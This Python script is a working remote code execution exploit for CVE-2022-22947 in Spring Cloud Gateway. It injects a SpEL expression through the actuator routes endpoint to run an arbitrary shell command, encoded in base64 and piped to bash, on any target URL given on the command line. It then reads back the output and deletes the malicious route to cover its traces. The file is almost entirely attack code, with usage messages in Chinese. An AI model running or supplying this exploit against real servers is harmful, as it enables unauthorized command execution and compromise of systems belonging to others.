import requests
import json
import sys
import re

def getargs():
    if (len(sys.argv) >= 2) and (len(sys.argv) <= 3):
        if re.findall('^http[s]?://.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?[/]?$',sys.argv[1]):
            target = re.findall('^http[s]?://.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?',sys.argv[1])[0]
            if len(sys.argv) == 3:
                cmd = sys.argv[2]
            else:
                cmd = "id"
            cmd = 'echo ' + base64.b64encode(cmd.encode()).decode() + '|{base64,-d}|bash'
            return target,cmd
        else:
            print('URL参数错误！格式：http(https)://www.baidu.com[:prot]')
            exit()
    else:
        print('参数错误！使用：python CVE-2022-22947.py target "cmd"')
        exit()

def rce(target,cmd):
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Content-Type": "application/json"
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "id": "qingchen",
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\""+ cmd +"\").getInputStream()))}"
            }
        }],
        "uri": "http://127.0.0.1",
        "order": 0
    }

    requests.post(url=target + "/actuator/gateway/routes/qingchen", headers=headers1, data=json.dumps(data,ensure_ascii = False), verify=False)
    requests.post(url=target + "/actuator/gateway/refresh", headers=headers2, verify=False)
    rep = requests.get(url=target + "/actuator/gateway/routes/qingchen", headers=headers2, verify=False)
    # print(rep.content.decode())
    requests.delete(url=target + "/actuator/gateway/routes/qingchen", headers=headers2, verify=False)
    return rep.content.decode()

def print_res(rep_data):
    res = re.findall("AddResponseHeader Result = '(.*)'], order",rep_data)[0]
    res = res.split("\\n")
    for i in res:
        print(i)


if __name__ == '__main__':
    args = getargs()
    rep_data = rce(*args)
    print_res(rep_data)

